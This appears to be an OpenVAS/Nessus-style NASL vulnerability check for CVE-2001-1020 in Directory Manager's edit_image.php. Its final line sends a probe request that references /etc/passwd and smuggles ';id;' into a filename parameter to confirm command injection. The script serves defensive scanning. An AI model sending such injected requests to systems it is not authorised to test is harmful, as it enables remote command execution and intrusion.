if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80054" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 3288 );
	script_cve_id( "CVE-2001-1020" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Directory Manager's edit_image.php" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2008 Renaud Deraison" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Directory Manager is installed and does not properly filter user input." );
	script_tag( name: "impact", value: "A cracker may use this flaw to execute any command on your system." );
	script_tag( name: "solution", value: "Upgrade your software or firewall your web server" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
http_check_remote_code( check_request: "/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20", check_result: "uid=[0-9]+.*gid=[0-9]+.*", command: "id", port: port );

